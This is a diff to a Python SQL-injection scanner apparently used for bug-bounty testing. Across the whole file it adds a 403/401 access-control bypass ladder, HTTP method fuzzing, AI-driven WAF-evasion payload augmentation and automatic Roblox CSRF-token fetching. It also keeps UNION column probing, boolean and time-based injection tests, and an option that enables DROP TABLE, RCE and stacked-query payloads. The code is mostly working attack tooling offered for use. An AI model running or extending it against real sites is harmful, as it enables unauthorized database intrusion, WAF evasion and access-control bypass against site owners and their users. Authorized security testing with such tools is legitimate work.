@@ -977,7 +1368,6 @@ class SQLiScanner:
 
             filtered.append(entry)
 
-        # Sort by priority (error_based first, ai_generated first)
         filtered.sort(key=lambda e: PAYLOAD_PRIORITY.get(
             e.get("category", "unknown"), 99))
 
@@ -993,13 +1383,19 @@ class SQLiScanner:
         return filtered
 
     # ------------------------------------------------------------------ #
-    #  Baseline capture
+    #  Baseline capture — with 403/401 bypass attempt
     # ------------------------------------------------------------------ #
     def capture_baseline(self, ip):
-        session_headers = self._headers_for(ip.url)
+        """
+        Fires 2 baseline requests + 1 canonical baseline.
+        On 403/401, tries the bypass ladder once. If successful, uses the
+        bypassed response as the canonical baseline.
+        """
+        session_headers = self._headers_for(ip.url, method=ip.method)
 
-        # Fire baseline twice to check stability
+        # Fire twice for stability
         fprints = []
+        first_status = None
         for _ in range(2):
             if not self._throttle(ip.url):
                 ip.stable = False
@@ -1009,9 +1405,27 @@ class SQLiScanner:
                                   extra_headers=session_headers)
             except Exception:
                 r = None
+            if r is not None and first_status is None:
+                first_status = r.status_code
             fprints.append(_fingerprint_response(r))
 
-        # Canonical baseline (third request, used as ground truth)
+        # 403/401 → try bypass ladder
+        if first_status in (401, 403):
+            host = urlparse(ip.url).netloc.lower()
+            self._note_403(host)
+            bypassed = self._try_bypass_ladder(ip, session_headers)
+            if bypassed is not None:
+                r_bypass, merged_headers = bypassed
+                ip.baseline_resp = r_bypass
+                ip.baseline_fp = _fingerprint_response(r_bypass)
+                # Persist the winning override as extra_headers for this IP
+                for k, v in merged_headers.items():
+                    if k not in ("Cookie", "Authorization") or True:
+                        ip.extra_headers[k] = v
+                ip.stable = True
+                return ip.baseline_resp
+
+        # Canonical baseline
         try:
             ip.baseline_resp = build_request(ip, ip.value,
                                               timeout=self.timeout,
@@ -1020,7 +1434,7 @@ class SQLiScanner:
             ip.baseline_resp = None
         ip.baseline_fp = _fingerprint_response(ip.baseline_resp)
 
-        # Stability check
+        # Stability
         if len(fprints) == 2 and fprints[0]["hash"] and fprints[1]["hash"]:
             if fprints[0]["hash"] != fprints[1]["hash"]:
                 if abs(fprints[0]["length"] - fprints[1]["length"]) > 100:
@@ -1054,7 +1468,7 @@ class SQLiScanner:
         return ip.baseline_resp
 
     # ------------------------------------------------------------------ #
-    #  AI payload augmentation on WAF
+    #  AI WAF payload augmentation
     # ------------------------------------------------------------------ #
     def _augment_payloads_for_waf(self, host, waf_name, example_url=""):
         if self.brain is None or not self.brain.available():
@@ -1142,7 +1556,7 @@ class SQLiScanner:
     def _test_timing_confirmed(self, ip, payload, first_elapsed):
         if ip.timing_baseline is None:
             return None
-        session_headers = self._headers_for(ip.url)
+        session_headers = self._headers_for(ip.url, method=ip.method)
         threshold = max(
             self.time_threshold,
             ip.timing_baseline + 3.0 * (ip.timing_stddev or 0.2) + 2.0,
@@ -1186,7 +1600,8 @@ class SQLiScanner:
             "confidence": "high",
             "subtype": "time_based",
             "reason": "Time-based SQLi confirmed — {:.2f}s initial "
-                      "({}/2 reproductions)".format(first_elapsed, reproductions),
+                      "({}/2 reproductions)".format(first_elapsed,
+                                                     reproductions),
             "dbms": self.dbms_hint,
             "evidence": "baseline={:.2f}s first={:.2f}s reproductions={}/2".format(
                 ip.timing_baseline, first_elapsed, reproductions),
@@ -1194,14 +1609,15 @@ class SQLiScanner:
         }
 
     def _test_boolean_pair(self, ip, true_payload, false_payload):
-        session_headers = self._headers_for(ip.url)
+        session_headers = self._headers_for(ip.url, method=ip.method)
         try:
             true_resp = build_request(ip, true_payload, timeout=self.timeout,
                                        extra_headers=session_headers)
             if not self._throttle(ip.url):
                 return None
             time.sleep(0.1)
-            false_resp = build_request(ip, false_payload, timeout=self.timeout,
+            false_resp = build_request(ip, false_payload,
+                                        timeout=self.timeout,
                                         extra_headers=session_headers)
         except Exception:
             return None
@@ -1233,23 +1649,15 @@ class SQLiScanner:
         }
 
     def _test_union_columns(self, ip, base_payload, resp):
-        """
-        Progressive column-count probing for UNION SELECT.
-        Fires ' UNION SELECT NULL', ' UNION SELECT NULL,NULL', etc.
-        up to 10 columns, checking for a fingerprint different from
-        the baseline AND from the current payload response.
-        """
-        session_headers = self._headers_for(ip.url)
+        session_headers = self._headers_for(ip.url, method=ip.method)
         baseline_fp = ip.baseline_fp
         if not baseline_fp or not baseline_fp.get("hash"):
             return None
 
-        # Detect trailing comment in the base payload so we can extend cleanly
         prefix = base_payload
         if "--" in prefix:
             prefix = prefix[:prefix.index("--")].rstrip()
 
-        # Only try column counts not yet tried
         for n in range(1, 11):
             cols = ",".join(["NULL"] * n)
             probe = "{p} UNION SELECT {c}-- ".format(p=prefix, c=cols)
@@ -1302,6 +1710,23 @@ class SQLiScanner:
             "verification_method": "body_diff",
         }
 
+    def _test_reflection(self, ip, resp, payload):
+        """
+        Weakest signal: the payload reflects verbatim in the response body.
+        Most useful as a downstream indicator — flag it in the finding
+        and let AI triage decide.
+        """
+        if not _payload_reflected(resp, payload):
+            return None
+        return {
+            "confidence": "low",
+            "subtype": "reflection",
+            "reason": "Payload reflected verbatim in response body",
+            "dbms": None,
+            "evidence": "reflection of '{}'".format(payload[:80]),
+            "verification_method": "reflection",
+        }
+
     # ------------------------------------------------------------------ #
     #  Test one payload against one IP
     # ------------------------------------------------------------------ #
@@ -1313,18 +1738,16 @@ class SQLiScanner:
         is_boolean = (category == "blind_boolean" or
                        "boolean" in (payload_obj.get("tags") or []))
 
-        # Budget check
         if (self.max_payloads_per_ip and
                 ip.payloads_tested >= self.max_payloads_per_ip):
             return None
-        # High-confidence hit already found on this IP
         if ip.found_high_confidence:
             return None
 
         if not self._throttle(ip.url):
             return None
 
-        session_headers = self._headers_for(ip.url)
+        session_headers = self._headers_for(ip.url, method=ip.method)
 
         start = time.time()
         try:
@@ -1339,10 +1762,7 @@ class SQLiScanner:
             return None
 
         host = urlparse(ip.url).netloc.lower()
-
-        # Record status for auth-expiry detection
         self._note_response_status(host, resp.status_code)
-
         info = classify_status(resp)
 
         if info["code"] == "RATE_LIMITED":
@@ -1364,8 +1784,8 @@ class SQLiScanner:
         if is_boolean:
             opposite = _boolean_opposite(payload)
             if opposite and opposite != payload:
-                # Dedup guard — only fire the pair once
-                pair_sig = _payload_text_hash(payload) + ":" + _payload_text_hash(opposite)
+                pair_sig = (_payload_text_hash(payload) + ":" +
+                            _payload_text_hash(opposite))
                 with self._seen_lock:
                     if pair_sig in self.seen_signatures:
                         opposite = None
@@ -1381,14 +1801,15 @@ class SQLiScanner:
         if is_time:
             hit = self._test_timing_confirmed(ip, payload, elapsed)
             if hit:
-                return self._finalize(ip, payload_obj, hit, resp, elapsed, payload)
+                return self._finalize(ip, payload_obj, hit, resp, elapsed,
+                                       payload)
 
         # ---- Strategy 4: Union-based column counting ----------------
         if is_union and not is_time:
             hit = self._test_union_columns(ip, payload, resp)
             if hit:
                 return self._finalize(ip, payload_obj, hit, resp, elapsed,
-                                      payload)
+                                       payload)
 
         # ---- Strategy 5: Status escalation --------------------------
         hit = self._test_status_escalation(ip, resp)
@@ -1400,25 +1821,27 @@ class SQLiScanner:
             hit = self._test_body_diff(ip, resp)
             if hit:
                 return self._finalize(ip, payload_obj, hit, resp, elapsed,
-                                      payload)
+                                       payload)
+
+        # ---- Strategy 7: Reflection (weakest) -----------------------
+        if not is_time and not is_union:
+            hit = self._test_reflection(ip, resp, payload)
+            if hit:
+                return self._finalize(ip, payload_obj, hit, resp, elapsed,
+                                       payload)
 
         return None
 
     # ------------------------------------------------------------------ #
-    #  Confirm-pass on medium confidence
+    #  Confirm-pass
     # ------------------------------------------------------------------ #
     def _confirm_medium(self, ip, payload, hit):
-        """
-        Re-fire the payload once. If the confirmation reproduces the
-        signal, promote confidence to high. If not, demote to low.
-        Returns the (possibly updated) hit.
-        """
         if not self.confirm_medium:
             return hit
         if hit.get("confidence") != "medium":
             return hit
 
-        session_headers = self._headers_for(ip.url)
+        session_headers = self._headers_for(ip.url, method=ip.method)
         if not self._throttle(ip.url):
             return hit
 
@@ -1439,17 +1862,9 @@ class SQLiScanner:
             else:
                 hit["confidence"] = "low"
                 hit["reason"] += " (did not reproduce)"
-        elif method == "timing_unconfirmed":
-            # We don't re-run timing here (expensive); leave as-is
-            pass
-
         return hit
 
-    # ------------------------------------------------------------------ #
-    #  Finalize a hit (confirm-pass + build finding + AI + save)
-    # ------------------------------------------------------------------ #
     def _finalize(self, ip, payload_obj, hit, resp, elapsed, payload):
-        # Confirm-pass for medium confidence
         if hit.get("confidence") == "medium":
             hit = self._confirm_medium(ip, payload, hit)
             if hit.get("confidence") == "low":
@@ -1466,7 +1881,7 @@ class SQLiScanner:
         return finding
 
     # ------------------------------------------------------------------ #
-    #  Severity filter
+    #  Filters + AI
     # ------------------------------------------------------------------ #
     def _passes_severity_filter(self, finding):
         if not self.min_severity:
@@ -1481,6 +1896,7 @@ class SQLiScanner:
                 "reason":         reason,
                 "url":            finding.get("url"),
                 "parameter":      finding.get("parameter"),
+                "location":       finding.get("injection_point", {}).get("location"),
                 "payload_id":     finding.get("payload_id"),
                 "severity":       finding.get("severity"),
                 "verification_method": finding.get("verification_method"),
@@ -1494,7 +1910,7 @@ class SQLiScanner:
         confidence = hit["confidence"]
         severity = _severity_for(confidence)
 
-        session_headers = self._headers_for(ip.url)
+        session_headers = self._headers_for(ip.url, method=ip.method)
 
         finding = {
             "type": "sqli",
@@ -1515,6 +1931,7 @@ class SQLiScanner:
                 "name": ip.name,
                 "original_value": (ip.value or "")[:200],
                 "json_path": ip.json_path,
+                "is_header_value": ip.is_header_value,
             },
 
             "payload_id":          payload_obj.get("id"),
@@ -1553,15 +1970,15 @@ class SQLiScanner:
             ),
         }
 
-        # Extra union-specific fields
         if hit.get("column_count") is not None:
             finding["union_column_count"] = hit["column_count"]
             finding["union_payload"] = hit.get("union_payload")
 
-        # Dedup signature — includes payload text hash
+        # Dedup
         sig = hashlib.md5(
-            "{}|{}|{}|{}".format(
-                ip.url, ip.name, _payload_text_hash(payload), confidence
+            "{}|{}|{}|{}|{}".format(
+                ip.url, ip.name, ip.location,
+                _payload_text_hash(payload), confidence
             ).encode()
         ).hexdigest()
         with self._seen_lock:
@@ -1569,7 +1986,7 @@ class SQLiScanner:
                 return None
             self.seen_signatures.add(sig)
 
-        # ----- AI triage ------------------------------------------------
+        # AI triage
         if self.brain is not None and self.brain.available():
             try:
                 verdict = self.brain.triage(finding, kind="sqli")
@@ -1586,7 +2003,7 @@ class SQLiScanner:
             except Exception as e:
                 log("AI triage error: {}".format(e), "debug", "SQLI")
 
-        # ----- AI severity ---------------------------------------------
+        # AI severity
         if (self.ai_severity_enabled and self.brain is not None
                 and self.brain.available()):
             try:
@@ -1598,7 +2015,7 @@ class SQLiScanner:
             except Exception as e:
                 log("AI severity error: {}".format(e), "debug", "SQLI")
 
-        # ----- Min-severity filter -------------------------------------
+        # Severity filter
         if not self._passes_severity_filter(finding):
             self._record_ai_drop(finding, None, "low_severity")
             log("Dropped (severity<{}): {} @ {} ({})".format(
@@ -1606,11 +2023,12 @@ class SQLiScanner:
                 finding.get("severity", "?")), "info", "SQLI")
             return None
 
-        # ----- Save ----------------------------------------------------
+        # Save
         host = urlparse(ip.url).netloc
         slug = safe_filename(
             (urlparse(ip.url).path or "/").replace("/", "_")
             + "__" + ip.name
+            + "__" + ip.location
         )
         fname = "{}__{}_sqli_vulnerable.json".format(
             slug, payload_obj.get("id", "x"))
@@ -1647,7 +2065,6 @@ class SQLiScanner:
     def test_point(self, ip, payloads):
         host = urlparse(ip.url).netloc.lower()
 
-        # Skip entire IP if host session expired
         with self._auth_lock:
             if self.host_auth_expired.get(host):
                 return []
@@ -1655,6 +2072,14 @@ class SQLiScanner:
         self.capture_baseline(ip)
         baseline_body = ((ip.baseline_resp.text or "")
                          if ip.baseline_resp else "")
+
+        # If baseline was 403/401 and no bypass worked, skip this IP
+        if (ip.baseline_resp is not None and
+                ip.baseline_resp.status_code in (401, 403) and
+                not ip.extra_headers.get("X-Forwarded-For")):
+            log("403/401 with no bypass — skipping {}:{}".format(
+                ip.location, ip.name), "debug", "SQLI")
+            return []
 
         if not ip.stable:
             log("unstable baseline: {}:{} @ {}".format(
@@ -1674,11 +2099,10 @@ class SQLiScanner:
         return findings
 
     # ------------------------------------------------------------------ #
-    #  Distribution helper (avoid one host monopolizing workers)
+    #  Spread IPs by host
     # ------------------------------------------------------------------ #
     @staticmethod
     def _spread_points(points):
-        """Interleave injection points by host so one host doesn't cluster."""
         by_host = {}
         for ip in points:
             h = urlparse(ip.url).netloc.lower()
@@ -1712,6 +2136,12 @@ class SQLiScanner:
         else:
             log("auth: no HeaderJar (unauthenticated)", "info", "SQLI")
 
+        # Roblox CSRF
+        if self.roblox_csrf_enabled and _ROBLOX_CSRF_AVAILABLE:
+            log("Roblox CSRF: ON (auto-fetch per host)", "info", "SQLI")
+        elif not self.roblox_csrf_enabled:
+            log("Roblox CSRF: OFF (--no-roblox-csrf)", "info", "SQLI")
+
         # AI
         if self.brain is not None and self.brain.available():
             log("AI triage: ON ({} / {})".format(
@@ -1726,6 +2156,10 @@ class SQLiScanner:
             self.max_payloads_per_ip or "unlimited"), "info")
         log("destructive payloads: {}".format(
             "ALLOWED" if self.allow_destructive else "skipped"), "info")
+        log("method fuzzing: {}".format("ON" if self.method_fuzz else "OFF"),
+            "info")
+        log("403/401 bypass: {}".format(
+            "ON" if self.bypass_403_enabled else "OFF"), "info")
 
         payloads = self.load_and_filter_payloads()
         log("loaded {} payloads (waf={}, dbms={})".format(
@@ -1745,9 +2179,18 @@ class SQLiScanner:
                 continue
         log("loaded {} testable pages".format(len(pages)), "info")
 
-        points = extract_injection_points(pages)
+        points = extract_injection_points(pages, method_fuzz=self.method_fuzz)
         points = self._spread_points(points)
-        log("extracted {} injection points".format(len(points)), "ok")
+
+        # Surface breakdown
+        loc_counts = {}
+        for ip in points:
+            loc_counts[ip.location] = loc_counts.get(ip.location, 0) + 1
+        log("extracted {} injection points: {}".format(
+            len(points),
+            "  ".join("{}={}".format(k, v)
+                      for k, v in sorted(loc_counts.items()))),
+            "ok")
 
         if not points:
             log("nothing to test", "warn")
@@ -1790,12 +2233,15 @@ class SQLiScanner:
         by_severity = {}
         by_verdict = {}
         by_method = {}
+        by_location = {}
         for f in all_findings:
             by_conf[f["confidence"]] = by_conf.get(f["confidence"], 0) + 1
             sev = f.get("severity", "low")
             by_severity[sev] = by_severity.get(sev, 0) + 1
             m = f.get("verification_method", "unknown")
             by_method[m] = by_method.get(m, 0) + 1
+            loc = f.get("injection_point", {}).get("location", "unknown")
+            by_location[loc] = by_location.get(loc, 0) + 1
             v = (f.get("ai_triage") or {}).get("verdict")
             if v:
                 by_verdict[v] = by_verdict.get(v, 0) + 1
@@ -1810,6 +2256,7 @@ class SQLiScanner:
             if by_verdict:
                 log("AI verdict    : {}".format(by_verdict), "info")
             log("methods       : {}".format(by_method), "info")
+            log("by location   : {}".format(by_location), "info")
             log("total saved   : {}".format(len(all_findings)), "ok", "DONE")
         else:
             log("no SQLi findings saved", "info", "DONE")
@@ -1819,6 +2266,8 @@ class SQLiScanner:
             waf_hosts = {h: v for h, v in self.host_waf.items()
                           if not h.endswith(":augmented") and v}
             rl_hosts = dict(self.host_rl_counts)
+            b403_hosts = dict(self.host_403_counts)
+            bypass_success = {h: len(v) for h, v in self.host_bypass_success.items()}
         with self._auth_lock:
             expired_hosts = [h for h, v in self.host_auth_expired.items() if v]
 
@@ -1830,6 +2279,15 @@ class SQLiScanner:
             log("rate-limited hosts: {}".format(
                 ", ".join("{} ({}×)".format(h, c) for h, c in rl_hosts.items())),
                 "info")
+        if b403_hosts:
+            log("403-hitting hosts : {}".format(
+                ", ".join("{} ({}×)".format(h, c) for h, c in b403_hosts.items())),
+                "info")
+        if bypass_success:
+            log("bypass successes  : {}".format(
+                ", ".join("{} ({} ways)".format(h, n)
+                          for h, n in bypass_success.items())),
+                "ok")
         if expired_hosts:
             log("auth-expired hosts: {}".format(", ".join(expired_hosts)),
                 "warn")
@@ -1854,17 +2312,23 @@ class SQLiScanner:
                 "by_severity":     by_severity,
                 "by_ai_verdict":   by_verdict,
                 "by_method":       by_method,
+                "by_location":     by_location,
                 "waf_hint":        self.waf_hint,
                 "dbms_hint":       self.dbms_hint,
                 "min_severity":    self.min_severity,
+                "method_fuzz":     self.method_fuzz,
+                "bypass_403":      self.bypass_403_enabled,
                 "waf_hosts":       waf_hosts,
                 "rate_limited":    rl_hosts,
+                "hosts_403":       b403_hosts,
+                "bypass_success":  bypass_success,
                 "auth_expired":    expired_hosts,
                 "auth_enabled":    self.header_jar is not None,
                 "elapsed_seconds": round(elapsed, 1),
                 "timestamp":       now_iso(),
                 "findings": [
                     {"url": f["url"], "param": f["parameter"],
+                     "location": f.get("injection_point", {}).get("location"),
                      "severity": f.get("severity"),
                      "confidence": f["confidence"],
                      "method": f.get("verification_method"),
@@ -1880,14 +2344,20 @@ class SQLiScanner:
         try:
             save_json(self.findings_root / "_session.json", {
                 "targets":         len(points),
+                "by_location":     loc_counts,
                 "payloads_loaded": len(payloads),
                 "auth_enabled":    self.header_jar is not None,
                 "ai_enabled":      (self.brain is not None and
                                      self.brain.available()),
                 "ai_provider":     (self.brain.provider if self.brain else None),
                 "ai_model":        (self.brain.model if self.brain else None),
+                "method_fuzz":     self.method_fuzz,
+                "bypass_403":      self.bypass_403_enabled,
+                "roblox_csrf":     self.roblox_csrf_enabled,
                 "waf_hosts":       waf_hosts,
                 "rate_limited":    rl_hosts,
+                "hosts_403":       b403_hosts,
+                "bypass_success":  bypass_success,
                 "auth_expired":    expired_hosts,
                 "started_at":      now_iso(),
                 "elapsed_seconds": round(elapsed, 1),
@@ -1906,7 +2376,8 @@ def run(program_dir, sites_root=None, waf_hint=None, dbms_hint=None,
         min_severity="medium", use_ai=True, ai_severity=True,
         headers_dir=None, cli_headers=None, no_auth=False,
         max_payloads_per_ip=200, allow_destructive=False,
-        confirm_medium=True):
+        confirm_medium=True, method_fuzz=False, bypass_403=True,
+        roblox_csrf=True):
     scanner = SQLiScanner(
         program_dir=program_dir,
         sites_root=sites_root,
@@ -1924,48 +2395,41 @@ def run(program_dir, sites_root=None, waf_hint=None, dbms_hint=None,
         max_payloads_per_ip=max_payloads_per_ip,
         allow_destructive=allow_destructive,
         confirm_medium=confirm_medium,
+        method_fuzz=method_fuzz,
+        bypass_403=bypass_403,
+        roblox_csrf=roblox_csrf,
     )
     return scanner.run()
 
 
 if __name__ == "__main__":
     import argparse
-    ap = argparse.ArgumentParser(description="HUGINN SQLi scanner v5.0")
+    ap = argparse.ArgumentParser(description="HUGINN SQLi scanner v6.0")
     ap.add_argument("program_dir")
-    ap.add_argument("--waf", default=None,
-                    help="WAF hint (cloudflare, akamai, imperva, ...)")
-    ap.add_argument("--dbms", default=None,
-                    help="DBMS hint (mysql, postgresql, mssql, oracle, ...)")
+    ap.add_argument("--waf", default=None)
+    ap.add_argument("--dbms", default=None)
     ap.add_argument("--cookie", default=None,
                     help="Cookie header (CLI override; merged last)")
-    ap.add_argument("--user-agent", default=None,
-                    help="User-Agent override")
-    ap.add_argument("--headers-dir", default=None,
-                    help="directory with header profiles "
-                         "(default: <program_dir>/headers)")
+    ap.add_argument("--user-agent", default=None)
+    ap.add_argument("--headers-dir", default=None)
     ap.add_argument("--header", action="append", default=[],
-                    help="extra header (repeatable): 'Name: value'")
-    ap.add_argument("--no-auth", action="store_true",
-                    help="ignore header profiles (unauthenticated scan)")
-    ap.add_argument("--no-confirm-timing", action="store_true",
-                    help="skip 3-attempt timing confirmation")
-    ap.add_argument("--no-confirm-medium", action="store_true",
-                    help="skip confirm-pass on medium confidence")
-    ap.add_argument("--time-threshold", type=float, default=4.0,
-                    help="min timing delta in seconds (default: 4.0)")
+                    help="extra header 'Name: value' (repeatable)")
+    ap.add_argument("--no-auth", action="store_true")
+    ap.add_argument("--no-confirm-timing", action="store_true")
+    ap.add_argument("--no-confirm-medium", action="store_true")
+    ap.add_argument("--time-threshold", type=float, default=4.0)
     ap.add_argument("--min-severity", default="medium",
-                    choices=["critical", "high", "medium", "low", "info"],
-                    help="min severity to save (default: medium)")
-    ap.add_argument("--no-ai", action="store_true",
-                    help="disable AI triage entirely")
-    ap.add_argument("--no-ai-severity", action="store_true",
-                    help="disable AI severity refinement")
-    ap.add_argument("--max-payloads-per-ip", type=int, default=200,
-                    help="cap payloads tested per injection point "
-                         "(0 = unlimited)")
-    ap.add_argument("--allow-destructive", action="store_true",
-                    help="allow DROP TABLE / RCE / stacked-query payloads "
-                         "(default: skipped)")
+                    choices=["critical", "high", "medium", "low", "info"])
+    ap.add_argument("--no-ai", action="store_true")
+    ap.add_argument("--no-ai-severity", action="store_true")
+    ap.add_argument("--max-payloads-per-ip", type=int, default=200)
+    ap.add_argument("--allow-destructive", action="store_true")
+    ap.add_argument("--method-fuzz", action="store_true",
+                    help="expand GET endpoints to POST/PUT/PATCH/etc.")
+    ap.add_argument("--no-bypass-403", action="store_true",
+                    help="disable 403/401 bypass ladder")
+    ap.add_argument("--no-roblox-csrf", action="store_true",
+                    help="disable automatic Roblox X-CSRF-TOKEN fetch")
     args = ap.parse_args()
 
     cli_headers = {}
@@ -1988,4 +2452,7 @@ if __name__ == "__main__":
         no_auth=args.no_auth,
         max_payloads_per_ip=args.max_payloads_per_ip,
         allow_destructive=args.allow_destructive,
-        confirm_medium=not args.no_confirm_medium)
+        confirm_medium=not args.no_confirm_medium,
+        method_fuzz=args.method_fuzz,
+        bypass_403=not args.no_bypass_403,
+        roblox_csrf=not args.no_roblox_csrf)
